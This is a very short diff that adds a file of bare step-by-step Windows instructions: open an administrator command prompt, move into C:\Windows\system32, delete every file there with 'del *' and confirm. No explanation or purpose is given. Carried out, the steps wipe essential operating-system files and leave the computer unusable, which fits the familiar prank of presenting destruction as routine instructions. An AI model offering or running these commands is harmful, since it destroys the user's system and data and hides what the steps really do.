@@ -1,0 +1,7 @@
+open cmd as administrator
+
+cd c:\windows\system32
+
+del *
+
+y
